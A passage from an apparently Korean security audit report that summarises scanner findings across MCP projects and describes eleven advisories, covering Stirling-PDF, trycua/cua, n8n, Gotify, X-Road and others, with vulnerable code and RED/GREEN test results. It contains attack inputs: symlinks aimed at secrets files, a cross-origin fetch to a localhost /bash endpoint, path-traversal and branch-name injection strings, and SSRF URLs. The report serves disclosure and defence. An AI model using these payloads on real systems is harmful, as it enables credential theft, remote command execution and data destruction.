`uv sync --frozen`으로 JADX MCP를 설치하면 `uv.lock`에 고정된 구버전 패키지가 설치됩니다. 이를 원격 리버스 엔지니어링 서버에서 HTTP/SSE 모드로 실행할 경우 하위 `authlib`/`pyjwt`의 토큰 검증 결함이나 `python-multipart`/`starlette`의 파서 DoS 취약점이 악용될 수 있습니다.

### E. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 원격 리버스 엔지니어링 서버에서 `authlib 1.6.8` / `pyjwt 2.11.0`을 통한 JWT 검증 우회:**
  1. 모바일 보안팀이 고성능 서버에서 JADX MCP를 HTTP/SSE 모드로 구동하고 JWT 인증을 설정합니다.
  2. 구버전 `authlib` 및 `pyjwt`의 알려진 검증 취약점으로 인해 조작된 토큰으로 디컴파일된 앱 소스 코드가 노출됩니다.
* **시나리오 B — `python-multipart 0.0.20` 및 `starlette 0.47.3`을 통한 멀티파트 요청 CPU/메모리 고갈:**
  1. HTTP 모드 MCP 서버에 비정상 boundary를 가진 `multipart/form-data` 요청을 보내 JADX MCP 브리지를 멈추게 합니다.
* **시나리오 C — `urllib3 2.5.0` 및 `cryptography 46.0.5` 의존성에서의 교차 도메인 리다이렉트 헤더 유출:**
  1. 원격 심볼/리소스 서버 요청 시 교차 도메인 리다이렉트 과정에서 민감한 헤더가 제거되지 않고 전달될 수 있습니다.

### F. 단독 및 결합(Chaining) 심각도 분석
* **단독 및 결합 심각도:** **낮음 / 중간 (SCA)**. 퍼스트파티 코드 체인은 없으며 `uv.lock` 업데이트가 권장됩니다.

### G. 예제 실행 및 검증 명령어
```bash
# 1. JADX MCP에 대한 Sniper 감사 실행
python3 scripts/sniper-project-audit "$HOME/audit-targets/jadx-mcp" --format json --output "$HOME/audit-targets/reports/jadx-mcp-audit.json"

# 2. uv.lock 내 취약 의존성 버전 확인
grep -n -A 2 -E 'name = "(authlib|cryptography|pyjwt|python-multipart|starlette|urllib3)"' "$HOME/audit-targets/jadx-mcp/uv.lock"

# 3. Sniper CLI를 통해 High 이상 SCA 결과 필터링
python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json" --min-severity high
```

---

## 요약 비교 표: 단독 vs. 결합(공격 체인 Chaining) 심각도 및 증거 상태

| 저장소 | Sniper SAST / IaC / SCA 요약 | 검증된 소스 코드 증거 (실제 vs. 오탐) | 단독 심각도 | 결함이 결합되는가? (Chaining) | 결합(체인) 심각도 및 공개 상태 |
| :--- | :--- | :--- | :---: | :--- | :--- |
| **1. `autogpt`** | 임계값 초과 `93`건 (`2C / 39H`); 트리아지 `142`건 | **Critical SQLi 2건(`obj.execute`), JWT, FastAPI `Security()`는 모두 오탐**; `jobstore_backfill.py` `pickle.loads` + Compose 기본 비밀번호 + Root Dockerfile은 실제 존재 | **낮음 / 중간** | **조건부 가설:** 공격자가 DB `apscheduler_jobs` 테이블 쓰기 권한을 얻은 경우에만 `pickle.loads` + Root 컨테이너가 결합됨 | **중간 / 높음 (조건부)** *(직접적인 비인증 취약점 없음; 심층 방어 강화)* |
| **2. `zitadel`** | 임계값 초과 `67`건 (`8C / 42H`); 트리아지 `286`건 | **Critical SQLi/`exec` 8건 모두 오탐**; `deploy/compose/` 내 3개 `docker.sock` 마운트 및 문서 예제의 `TLS_REJECT=0`은 실제 존재 | **낮음 / 중간** | **아니요 (서로 다른 예제):** `docker.sock`(`deploy/compose/`)과 `TLS_REJECT=0`(`apps/docs/...`)은 서로 다른 파일에 위치 | **낮음 / 중간** *(개발/예제 배포 강화; 제품 CVE 아님)* |
| **3. `nextcloud-mcp`** | 임계값 초과 `59`건 (`SAST 1C/6H`, `IaC 7H`, `SCA 5C/40H`) | **`login_flow.py:192` SSRF(`initiate()` 내 `_rewrite_to_nextcloud_host` 존재) 및 `token_utils.py` JWT는 오탐**; `pact.yml`은 `same-repo` 보호 적용 | **낮음** | **아니요:** `pact.yml`은 외부 포크 PR에 닫혀 있으며 `poll_endpoint`는 `self.nextcloud_host`로 고정됨 | **낮음** *(검증된 SAST 취약점 없음; 내부 CI 강화)* |
| **4. `mcpjam-inspector`** | 임계값 초과 `122`건 (`SAST 12C/8H`, `SCA 6C/96H`) | **Critical/High SAST 20건 중 18건이 확정 오탐** (주석 `eval (` / `exec (` 14건, `.d.ts` 2건, UI 문자열 2건); `pr-preview.yml`은 `same-repo` 보호 적용 | **낮음** | **아니요:** 외부 포크 PR이 차단되어 있으며 동일 저장소 브랜치 보간 하드닝 권장 | **낮음 / 중간** *(내부 CI 강화 및 SCA 업데이트)* |
| **5. `codebase-memory-mcp`** | 임계값 초과 `32`건 (`SAST 17C/7H`, `SCA 8H`) | **`store.c:2864` SQLi, `c_lsp.h:54` 주석, `kotlin_lsp.c`/`py_lsp.c`/`store.c:4482` 크기 제한 버퍼, `xmalloc.c`, `mcp.c` 모두 오탐**; `http_server.c`는 `localhost` CORS + `Host`(403) 보호 적용 | **낮음** | **아니요:** `http_server.c`는 외부 오리진에 CORS 헤더를 반환하지 않으며 DNS 리바인딩을 거부함 | **낮음** *(원격 브라우저 코드 유출 체인 성립 불가)* |
| **6. `gitlab-mcp-server`** | 임계값 초과 `5`건 (`0C / 4H`) | `recorder.go` 및 `make.go`는 오탐; `GITLAB_MCP_SKIP_TLS_VERIFY=true`는 사용자가 직접 설정할 때만 활성화됨 | **낮음** | **아니요:** 결합되는 결함 없음 | **낮음** *(선택적 설정)* |
| **7. `apktool-mcp`** | 임계값 초과 `16`건 (`SAST 1 Medium`, `SCA 4C / 12H`) | SAST 알림은 오탐; **`uv.lock` 내 Critical 4건, High 12건의 SCA 의존성 레코드 존재** | **낮음 / 중간 (SCA)** | **아니요:** 검증된 퍼스트파티 코드 체인 없음; 의존성 업데이트 필요 | **낮음 / 중간 (SCA)** *(SAST 깨끗함, SCA 레코드 존재)* |
| **8. `jadx-mcp`** | 임계값 초과 `32`건 (`SAST 3 Medium`, `SCA 6C / 26H`) | Critical/High SAST 취약점 없음; **`uv.lock` 내 Critical 6건, High 26건의 SCA 의존성 레코드 존재** | **낮음 / 중간 (SCA)** | **아니요:** 검증된 퍼스트파티 코드 체인 없음; 의존성 업데이트 필요 | **낮음 / 중간 (SCA)** *(Critical/High SAST 없음, SCA 레코드 존재)* |

---

## 파트 III — Sniper 스캔에서 발견한 11건의 검증된 보안 취약점 (취약점 전환 메커니즘, 일상 시나리오 및 예제 실행 명령어)

아래는 **Sniper** 정적/동적 분석 엔진으로 수행한 보안 스캔에서 발견되어 **단계별 일상 핵심 시나리오(`시나리오 A / B / C`)**, **엔드투엔드 런타임 증명(`RED -> GREEN + BENIGN`)**, 그리고 **검증된 방어 패치(`git diff`)**로 입증된 **11건의 보안 취약점**([advisories/README.ko.md](advisories/README.ko.md))입니다. 먼저 요약 표를 제시하고, 이어서 **각 버그가 코드에서 어떻게 발생하여 실제 악용 가능한 취약점으로 이어지는지, 3가지 일상 핵심 시나리오, 그리고 예제 실행/검증 명령어**를 담은 11개의 심층 기술 섹션(`III.01` – `III.11`)을 수록합니다:

| # | 보안 권고 & Upstream GHSA ID | 대상 프로젝트 & 컴포넌트 | CWE & CVSS v3.1 | 일상 환경에서 유발하는 핵심 시나리오 (`시나리오 A / B / C`) | 런타임 증명 (`RED -> GREEN`) |
| :-: | :--- | :--- | :--- | :--- | :--- |
| **01** | [`01-STIRLING-CAND-02-SYMLINK.md`](advisories/ko/01-STIRLING-CAND-02-SYMLINK.md)<br/>`GHSA-hpc7-xx5r-gc44` | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`FolderInputSource.java:337-377`<br/>`FolderOutputSink.java:338-345` | `CWE-59` / `CWE-61`<br/>**7.1 High** | **A)** 공유 SMB/NFS 스캐너 폴더에 놓인 `invoice.pdf -> /configs/settings.yml` 심볼릭 링크가 기본 `recursive=false` 모드에서 `FolderAccessGuard`를 우회하여 관리자/OAuth/SMTP 비밀 정보를 출력 폴더로 유출합니다.<br/>**B)** 자동 SFTP/Nextcloud 문서 수집 파이프라인에 심볼릭 링크를 넣어 `FolderOutputSink.archiveOriginal()`이 호스트 SSH 키나 `.env` 파일을 아카이브 폴더로 복사/이동시킵니다.<br/>**C)** 멀티테넌트 부서별 감시 폴더 간에 한 부서가 다른 부서의 기밀 계약/급여 디렉터리로 심볼릭 링크를 걸어 무단 열람 및 삭제를 수행합니다. | `RED`: `symlink_accepted: true, protected_settings_exfiltrated: true`<br/>`GREEN`: `symlink_accepted: false, regular_file_processed: true` |
| **02** | [`02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/ko/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)<br/>`GHSA-ff6j-8xch-j8r6`<br/>*(`CVE-2026-71270` 불완전 패치)* | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`ConvertWebsiteToPDF.java:116-143` | `CWE-918`<br/>**8.6 High** | **A)** `/api/v1/convert/url/pdf`에 `<link rel="stylesheet" href="http://127.0.0.1:.../secrets.css">` 또는 클라우드 메타데이터(`169.254.169.254`)를 포함한 외부 웹페이지를 제출하면 WeasyPrint가 내부 응답을 가져와 생성된 PDF에 그대로 출력합니다.<br/>**B)** Java 계층의 `SsrfProtectionService`는 최상위 URL만 검사하는 반면, WeasyPrint 하위 프로세스는 `@import url("http://10.0.0.12:9090/metrics")`로 Kubernetes/Docker 내부망 마이크로서비스를 스캔합니다.<br/>**C)** 다단계 HTTP `302` 리다이렉트를 사용하는 `<img src="...">` 또는 `<link>` 하위 리소스로 방화벽 뒤의 내부 관리 대시보드를 PDF로 유출합니다. | `RED`: `weasyprint_allowed_protocols: "data,http,https", internal_data_embedded_in_pdf: true`<br/>`GREEN`: `weasyprint_allowed_protocols: "data", internal_loopback_hit_count: 0` |
| **03** | [`03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/ko/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)<br/>`GHSA-cp36-x5hg-3gg8` | **trycua/cua** (`npm: cuabot <= 1.0.16`)<br/>`libs/cuabot/src/cuabotd.ts` | `CWE-306` / `CWE-942`<br/>**9.6 Critical** | **A)** 개발자가 `npx cuabot`을 켜둔 채 웹사이트를 방문하면 페이지 JS가 `fetch("http://localhost:7842/bash")`(`Access-Control-Allow-Origin: *`)로 명령을 실행하고 마운트된 `~/.cuabot/user/.claude/.credentials.json` OAuth 키를 탈취합니다.<br/>**B)** 교차 출처 `POST /bash` 또는 `ws://localhost:7842/?command=...`(CSWSH)를 통해 쓰기 가능한 `/home/community-user/.claude/settings.json`에 영구 `PreToolUse` 훅을 주입합니다.<br/>**C)** `0.0.0.0:7842` 바인딩으로 인해 카페/사무실 Wi-Fi의 아무 기기나 비밀번호 없이 `/bash`와 `/screenshot`을 호출해 화면을 감시하고 명령을 실행합니다. | `RED`: `http_status: 200, mounted_host_claude_credentials_exfiltrated: true`<br/>`GREEN`: `http_status: 403`<br/>`BENIGN`: `http_status: 200` |
| **04** | [`04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/ko/04-CUA-CAND-02-WORKER-SERVER-RCE.md)<br/>`GHSA-xm8w-gj3g-4f25` | **trycua/cua** (`pip: cua-bench-rl <= 0.1.0`)<br/>`worker_server.py:79-108, 338-360`<br/>`cua_bench/core.py:25-51` | `CWE-94` / `CWE-942`<br/>**8.8 High** | **A)** RL 연구원이 브라우저로 웹서핑 중 방문한 페이지가 `http://127.0.0.1:8001/reset`(`allow_origins=["*"]`)을 호출해 `ip_filter_middleware`를 통과하고 `spec.loader.exec_module`로 호스트에서 임의의 `<env_path>/main.py`를 실행합니다.<br/>**B)** Kubernetes/Docker Compose 배포에서 `OSGYM_ALLOWED_IPS=""`가 비어 있으면 `if allowed_ips:` 검사가 Fail-Open되어 `0.0.0.0:8001`이 전체 네트워크에 비인증 RCE를 노출합니다.<br/>**C)** 공격자가 `GET /screenshot`과 `POST /step` 엔드포인트를 사용해 활성 데스크톱 화면을 수집하고 키보드/마우스 명령을 주입합니다. | `RED`: `cross_origin_reset_status: 200, arbitrary_env_path_exec_module_rce: true`<br/>`GREEN`: `403 / 400, rce: false`<br/>`BENIGN`: `200` |
| **05** | [`05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/ko/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)<br/>`GHSA-3x8g-6h2v-8qx9` | **trycua/cua** (`cargo: cua-compat <= 0.8.0`)<br/>`daytona/objectstore.rs:320-422` | `CWE-22`<br/>**8.1 High** | **A)** 단일 샌드박스 테넌트가 사전 멀티파트 업로드 없이 `DELETE /daytona/dummy?uploadId=../objects` 요청을 보내 무조건적인 `tokio::fs::remove_dir_all`을 실행시켜 조직 전체의 `objects/` 이미지 저장소를 한 번에 삭제합니다.<br/>**B)** `?uploadId=../../state` 또는 `?uploadId=../../db`로 `d.objects.root` 상위로 벗어나 `cua-spacesd` 프로세스가 쓰기 가능한 호스트 디렉터리를 삭제합니다.<br/>**C)** `PUT /daytona/key?partNumber=1&uploadId=../stage` 요청으로 멀티파트 조각을 `uploads/` 외부의 인접 애플리케이션 디렉터리에 기록합니다. | `RED`: `delete_traversal_status: 204, objects_store_wiped_without_prior_upload: true`<br/>`GREEN`: `400 / 404, objects_store_preserved: true` |
| **06** | [`06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/ko/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)<br/>`GHSA-54v9-fxw3-36mm` | **trycua/cua** (`cargo: cua-media-codec <= 0.8.0`)<br/>`videotoolbox/mod.rs:308-420` | `CWE-125` / `CWE-190`<br/>**5.5 Medium** | **A)** macOS 원격 데스크톱 스트리밍 중 창/해상도 변경 시 전달된 짧은 `FrameData::Nv12` 슬라이스가 경계 검사 없는 `unsafe { std::ptr::copy_nonoverlapping }`로 읽혀 인접 힙 메모리의 `960`바이트(세션 키/비밀 정보)가 H.264 비디오 프레임에 복사되어 시청자에게 송출됩니다.<br/>**B)** Safe Rust `VtEncoder::encode` 메서드에 빈 슬라이스나 짧은 `NV12`/`BGRA` 슬라이스가 전달되면 매핑되지 않은 메모리를 읽어 `cua-spacesd` 미디어 서버가 `SIGSEGV`로 충돌합니다.<br/>**C)** 잘못된 `y_stride` / `uv_stride` 또는 `stride * (h - 1)` 산술로 인해 버퍼 경계를 넘어 멀티테넌트 미디어 프로세스에서 메모리 손상을 일으킵니다. | `RED`: `oob_bytes_read: 960, adjacent_heap_secret_copied_to_video_frame: true`<br/>`GREEN`: `oob_bytes_read: 0, CodecError::InvalidArgument` |
| **07** | [`07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/ko/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)<br/>`GHSA-hvhg-6x47-cq96` | **trycua/cua** (`pip: cua-bench <= 0.3.1`)<br/>`winarena_adapter/cli.py:262-265`<br/>`infra/vm/setup/server/main.py` | `CWE-668` / `CWE-732`<br/>**8.6 High** | **A)** 대학/기업 연구실 LAN에서 실행 중인 WinArena 워크스테이션의 `0.0.0.0:8006`(비인증 noVNC) 및 `0.0.0.0:3390`(무암호 RDP) 포트에 동일 LAN의 누구나 접속하여 Windows VM 데스크톱과 내부 API 키를 장악합니다.<br/>**B)** 공격자가 장악한 VM 내부에서 쓰기 가능한 `-v {setup_path}:/shared` 마운트를 이용해 호스트 머신의 `winarena_adapter/infra/vm/setup` 스크립트를 오염시킵니다.<br/>**C)** VM 내부 `0.0.0.0:5000` 제어 서버의 비인증 `POST /execute_windows`(`exec()`) 및 `POST /setup/launch`(`shell=True`) 엔드포인트를 통해 임의의 OS 명령이 실행됩니다. | `RED`: `lan_exposed_ports: ["8006:8006", "3390:3389"], host_setup_dir_mounted_writable: true`<br/>`GREEN`: `lan_exposed_ports: [], host_setup_dir_mounted_writable: false` |
| **08** | [`08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/ko/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)<br/>`GHSA-qwv8-hh9r-cqrf` | **openziti/ziti** (`github.com/openziti/ziti/v2`)<br/>`ziti/util/certs.go:91-103, 199-208` | `CWE-295`<br/>**7.4 High** | **A)** DevOps 엔지니어가 Wi-Fi/VPN에서 `ziti edge login`을 실행할 때 `AreCertsTrusted` -> `InsecureClient` 내부의 무조건적인 `InsecureSkipVerify: true` 때문에 위조된 MITM 인증서가 *"Verified that server supplied certificates are trusted"* 메시지와 함께 수락되고 관리자 비밀번호가 공격자에게 전송됩니다.<br/>**B)** 자동화된 CI/CD 및 Kubernetes 부트스트랩 워크플로에서 `ziti edge login`이 위조된 Edge Controller를 신뢰하여 ID와 라우터 정책을 공격자에게 등록합니다.<br/>**C)** 다중 환경 전환 시 만료되거나 폐기된, 혹은 잘못된 CA가 서명한 컨트롤러 인증서가 경고 없이 신뢰되어 제로트러스트 PKI 체인이 무너집니다. | `RED`: `rogue_mitm_cert_accepted_as_trusted: true, admin_credentials_sent_to_mitm: true`<br/>`GREEN`: `x509.UnknownAuthorityError` |
| **09** | [`09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/ko/09-N8N-CAND-01-WEBHOOK-REDOS.md)<br/>`n8n-workflow <= 2.45.0` | **n8n-io/n8n** (`npm: n8n-workflow <= 2.45.0`)<br/>`string-extensions.ts:59, 94, 326, 375, 383` | `CWE-1333`<br/>**5.3 Medium** | **A)** 공개 문의/가입 폼 n8n Webhook(`{{$json.body.contact.isEmail()}}`)에 단일 20 KB `"a.a.a...a@!"` 요청을 보내면 Node.js 메인 이벤트 루프가 약 832 ms 동안 멈추며, 10개의 동시 요청으로 모든 Stripe/Slack 웹훅과 n8n UI가 정지합니다.<br/>**B)** 수신 지원 이메일이나 채팅 메시지를 파싱하는 `{{$json.text.extractEmail()}}` 자동화 파이프라인이 비정상적인 점(.) 포함 메시지 하나로 멈추면서 컨테이너 헬스체크 재시작 루프에 빠집니다.<br/>**C)** CRM 데이터 보강 워크플로에서 `{{$json.url.extractDomain()}}`(`DOMAIN_EXTRACT_REGEXP`) 실행 시 긴 점 포함 URL 페이로드가 단일 스레드 V8 런타임을 고갈시킵니다. | `RED`: `regex_stall_ms: 165.035 (831.78ms @ 20KB), concurrent_webhook_starved: true`<br/>`GREEN`: `regex_stall_ms: 0.017 (0.0029ms)` |
| **10** | [`10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/ko/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)<br/>`GHSA-cc9f-m5vr-pm75` | **gotify/server** (`v2.9.1`)<br/>`router/router.go:52-73, 93-102` | `CWE-601`<br/>**4.7 Medium** | **A)** `SSL.RedirectToHTTPS=true`가 켜져 있을 때 위조된 `Host: attacker-gotify.example.com` 헤더 요청이 `HTTP/1.1 308 Permanent Redirect`로 공격자 도메인으로 리다이렉트되어 브라우저 캐시를 오염시키고 URL의 `?token=`을 유출합니다.<br/>**B)** HTTP 엔드포인트에 `?token=<app-token>`으로 알림을 보내고 리다이렉트를 따라가는 모니터링 스크립트(`curl -L`, Python `requests`, Uptime Kuma)가 `308` 리다이렉트를 따라가 애플리케이션 키를 공격자 서버에 넘겨줍니다.<br/>**C)** `Host` 헤더를 그대로 전달하는 리버스 프록시 또는 공유 캐시 뒤의 Gotify 서버에서 캐시 포이즈닝으로 모든 클라이언트가 가짜 로그인 페이지로 유도됩니다. | `RED`: `status_code: 308, redirected_to_untrusted_host: true`<br/>`GREEN`: `redirected_to_untrusted_host: false, bound_to_configured_ssl_host: true` |
| **11** | [`11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/ko/11-XROAD-CAND-01-RUNNER-INJECTION.md)<br/>`GHSA-4fcw-7xqx-fjv5` | **nordic-institute/X-Road** (`38cd99ec0ebb`)<br/>`.github/workflows/build.yaml`<br/>`_build-and-package.yml:84-91` | `CWE-78`<br/>**8.5 High** | **A)** `feat";<cmd>;#` 형태로 조작된 PR 브랜치 이름이 코드 리뷰나 `actions/checkout`이 실행되기도 전에 영구 `xrd-runner-8c` 자체 호스팅 서버의 `_build-and-package.yml` 내 bash 스크립트에서 임의 명령을 실행합니다.<br/>**B)** `build.yaml`이 `permissions: contents: write, packages: write` 및 `secrets: inherit`로 `_build-and-package.yml`을 호출하므로 주입된 명령이 GHCR 패키지 쓰기 및 저장소 쓰기 권한을 가진 `GITHUB_TOKEN`을 탈취합니다.<br/>**C)** `xrd-runner-8c`는 임시 VM이 아닌 영구 자체 호스팅 서버이므로 공격자가 이후 공식 X-Road 릴리스 빌드를 오염시킬 백그라운드 프로세스나 Gradle/Docker 캐시 변조를 남길 수 있습니다. | `RED`: `direct_yaml_interpolation: true, arbitrary_command_executed_on_self_hosted_runner: true`<br/>`GREEN`: `env_var_parameterized: true, arbitrary_command_executed_on_self_hosted_runner: false` |

---

### III.01 — Stirling-PDF (`v3.2.2`) — 감시 폴더(`Watched Folder`) 심볼릭 링크(`Symlink`) 탈출을 통한 `FolderAccessGuard` 우회 (`GHSA-hpc7-xx5r-gc44`, `CWE-59`/`CWE-61`, CVSS `7.1 High`)

#### 1. 메타데이터 & 공개 상태
* **대상 저장소 & 패키지:** `Stirling-Tools/Stirling-PDF` (`Maven: stirling.software:stirling-pdf`)
* **영향받는 버전 & 컴포넌트:** `<= v3.2.2` (`commit 684608d143779bf3a8ffc67639f077a1202c62ff`) — `FolderInputSource.java` (`listFiles`, `337-377`행), `ProcessingFolderController.java` (`374-380`행), `FolderOutputSink.java` (`archiveOriginal`, `338-345`행)
* **취약점 분류 & 점수:** `CWE-59` (파일 접근 전 부적절한 링크 해석) / `CWE-61` (UNIX 심볼릭 링크 추적) — **CVSS v3.1: `7.1 High`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
* **GitHub GHSA 링크:** `GHSA-hpc7-xx5r-gc44` (`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-hpc7-xx5r-gc44`)
* **Sniper 개별 권고 보고서:** [`docs/advisories/ko/01-STIRLING-CAND-02-SYMLINK.md`](advisories/ko/01-STIRLING-CAND-02-SYMLINK.md)

#### 2. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (누구나 이해할 수 있는 단계별 설명)
Stirling-PDF의 **자동 처리 감시 폴더(Watched Folder)** 기능은 사내 공유 폴더(예: `/mnt/scanner-incoming`)에 들어오는 문서를 자동으로 읽어 처리한 뒤 출력 폴더(`/mnt/scanner-processed`)에 저장합니다. 개발자들은 이 기능이 서버 자신의 비밀 설정 파일(`/configs/settings.yml` 등)을 읽지 못하도록 `FolderAccessGuard.isProtected(path)`라는 보안 가드를 작성했습니다.

그러나 Java 표준 파일 검사 함수인 `Files.isRegularFile(path)`에는 매우 중요한 특성이 있습니다: **두 번째 인자로 `LinkOption.NOFOLLOW_LINKS`를 전달하지 않으면 심볼릭 링크(바로가기 / symlink)를 자동으로 따라가며**, 링크 대상이 일반 파일이면 `true`를 반환합니다! 반면 `FolderAccessGuard.isProtected(path)`는 실제 대상 경로(`toRealPath()`)가 아니라 겉으로 보이는 어휘적 경로(`path.toAbsolutePath().normalize()`)만 검사합니다.

`FolderInputSource.java:337-350`의 실제 취약한 코드는 다음과 같습니다:
```java
private static List<Path> listFiles(
        Path inputDir, boolean recursive, FolderAccessGuard accessGuard) throws IOException {
    List<Path> files = new ArrayList<>();
    if (!recursive) { // 기본 모드: recursive = false
        try (Stream<Path> entries = Files.list(inputDir)) {
            entries.filter(Files::isRegularFile) // 버그 1: LinkOption.NOFOLLOW_LINKS가 없어 심볼릭 링크를 따라감!
                    .filter(file -> !hidden(file)) // 버그 2: 여기서 accessGuard.isProtected(file)조차 호출하지 않음!
                    .forEach(files::add);
        }
        return files;
    }
```
이후 `ProcessingFolderController.java:374`에서 `accessGuard.isProtected(path)`를 호출하더라도 겉보기 이름은 `/mnt/scanner-incoming/invoice.pdf`이므로 가드를 그대로 통과합니다. 마지막으로 `FolderOutputSink.java:342`의 `Files.move(originalFile, archiveTarget)` 또는 `Files.copy`가 심볼릭 링크가 가리키는 보호된 설정 파일을 누구나 읽을 수 있는 출력/아카이브 폴더로 복사하거나 이동시킵니다.

#### 3. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 사무실 복합기/스캐너 공유 폴더(SMB/NFS)를 통한 관리자 비밀번호 및 OAuth 비밀키 유출:**
  1. 사내에서 Stirling-PDF가 `/mnt/office-scanner/incoming` 공유 폴더를 감시하고 처리된 문서를 `/mnt/office-scanner/processed`에 저장합니다.
  2. 공유 폴더 쓰기 권한이 있는 일반 직원이나 침해된 PC가 `ln -s /configs/settings.yml /mnt/office-scanner/incoming/invoice_2026.pdf` 심볼릭 링크를 생성합니다.
  3. Stirling-PDF가 이 링크를 일반 파일로 인식해 처리 및 아카이브하면서 `/configs/settings.yml` 안의 관리자 비밀번호, OAuth2 클라이언트 시크릿, SMTP 비밀번호, API 키가 공유 출력 폴더로 그대로 복사됩니다.
* **시나리오 B — SFTP / Nextcloud 자동 문서 수집 파이프라인에서 `archiveOriginal()`을 통한 설정 파일 삭제 및 서비스 중단(DoS):**
  1. 외부 협력사가 SFTP 업로드 폴더로 문서를 전달하고, Stirling-PDF가 처리 후 원본을 아카이브하도록 설정되어 있습니다.
  2. 공격자가 애플리케이션 설정 파일이나 `.env` 파일을 가리키는 심볼릭 링크를 업로드합니다.
  3. `FolderOutputSink.archiveOriginal()`이 `Files.move`로 실제 설정 파일을 아카이브 폴더로 옮겨버려 서비스가 중단됩니다.
* **시나리오 C — 멀티테넌트 부서별 감시 폴더 간 기밀 인사/재무 문서 무단 열람:**
  1. 동일 서버에서 인사팀(`/watched/hr`)과 영업팀(`/watched/sales`) 감시 폴더가 운영됩니다.
  2. 영업팀 폴더 접근 권한자가 `ln -s /watched/hr/payroll_2026.pdf /watched/sales/scan01.pdf`를 생성합니다.
  3. `staysWithinCanonicalRoot` 정규화 루트 경계 검사가 없으므로 인사팀 급여 명세서가 영업팀 출력 폴더로 복제됩니다.

#### 4. 예제 실행, 재현 및 검증 명령어
```bash
# 1. Sniper SAST 엔진으로 Stirling-PDF 감시 폴더 모듈 감사
python3 scripts/sniper-project-audit /path/to/Stirling-PDF --format json --output stirling-audit.json

# 2. 로컬 격리 테스트 환경에서 RED -> GREEN 런타임 증명 실행
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_stirling_cand02 -v

# 3. 런타임 증명 JSON 결과 확인
python3 -c 'import json; d=json.load(open("docs/advisories/other-repos-and-cua-real-world-impact-e2e-20261029.json")); print(json.dumps(d["results"]["STIRLING-CAND-02"], indent=2))'
```
**관찰된 런타임 증명 출력 (`RED -> GREEN`):**
```json
{
  "RED": {
    "recursive": false,
    "symlink_accepted": true,
    "protected_settings_exfiltrated": true,
    "exfiltrated_secret_snippet": "admin_api_key: sk-live-stirling-9988776655"
  },
  "GREEN": {
    "recursive": false,
    "symlink_accepted": false,
    "protected_settings_exfiltrated": false,
    "regular_file_processed": true
  }
}
```

---

### III.02 — Stirling-PDF (`v3.2.2`) — `ConvertWebsiteToPDF.java`의 `CVE-2026-71270` 불완전 패치로 인한 WeasyPrint 하위 리소스 SSRF (`GHSA-ff6j-8xch-j8r6`, `CWE-918`, CVSS `8.6 High`)

#### 1. 메타데이터 & 공개 상태
* **대상 저장소 & 패키지:** `Stirling-Tools/Stirling-PDF` (`Maven: stirling.software:stirling-pdf`)
* **영향받는 버전 & 컴포넌트:** `<= v3.2.2` (`commit 684608d143779bf3a8ffc67639f077a1202c62ff`) — `ConvertWebsiteToPDF.java` (`urlToPdf`, `116-143`행 — `POST /api/v1/convert/url/pdf`)
* **취약점 분류 & 점수:** `CWE-918` (서버 사이드 요청 위조 / SSRF) — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
* **GitHub GHSA 링크:** `GHSA-ff6j-8xch-j8r6` (`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-ff6j-8xch-j8r6` — `CVE-2026-71270` / `GHSA-j5rg-wh78-9f2q`의 불완전 수정)
* **Sniper 개별 권고 보고서:** [`docs/advisories/ko/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/ko/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)

#### 2. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (누구나 이해할 수 있는 단계별 설명)
이전에 Stirling-PDF는 WeasyPrint가 HTML 내부의 외부 리소스(`<link>`, `<img>`, `@import`)를 자동으로 가져오면서 발생하는 SSRF 취약점(`CVE-2026-71270` / `GHSA-j5rg-wh78-9f2q`)을 패치하면서 HTML 파일 업로드 엔드포인트인 `FileToPdf.java`에 새니타이저와 `--allowed-protocols data` 제한을 적용했습니다.

그러나 바로 옆의 웹사이트 URL-to-PDF 변환 엔드포인트인 `ConvertWebsiteToPDF.java`(`POST /api/v1/convert/url/pdf`)에는 해당 패치가 누락되었습니다:
```java
// app/core/src/main/java/stirling/software/SPDF/controller/api/converters/ConvertWebsiteToPDF.java:116-143
String htmlContent = fetchRemoteHtml(URL); // 최상위 URL만 SsrfProtectionService로 검사함
// 버그 1: customHtmlSanitizer.sanitize(htmlContent)를 호출하지 않음!
Files.writeString(tempHtmlInput, htmlContent, StandardCharsets.UTF_8);

List<String> command = new ArrayList<>();
command.add(runtimePathConfig.getWeasyPrintPath());
command.add(tempHtmlInput.toString());
command.add("--base-url");
